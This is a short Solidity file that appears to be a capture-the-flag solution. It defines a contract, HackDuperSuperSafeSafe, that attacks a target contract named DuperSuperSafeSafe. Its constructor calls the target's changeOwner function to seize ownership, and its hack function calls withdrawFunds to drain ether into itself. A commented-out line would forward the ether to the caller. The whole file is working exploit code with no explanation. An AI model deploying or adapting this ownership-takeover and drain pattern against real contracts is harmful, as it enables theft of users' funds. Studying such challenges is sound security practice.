// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import  "./DuperSuperSafeSafe.sol";


contract HackDuperSuperSafeSafe{
    DuperSuperSafeSafe c;

    constructor(address payable _addr){
        c=DuperSuperSafeSafe(_addr);
        c.changeOwner(address(this));
    }


    function hack(uint256 _amount, bytes32 _secret_passphrase, bytes32 _secret_passphrase_2, uint _timestamp) external payable{
        c.withdrawFunds(_amount, _secret_passphrase, _secret_passphrase_2, _timestamp);
        //payable(msg.sender).transfer{value:_amount}();
    }

    receive() external payable{}
  
}
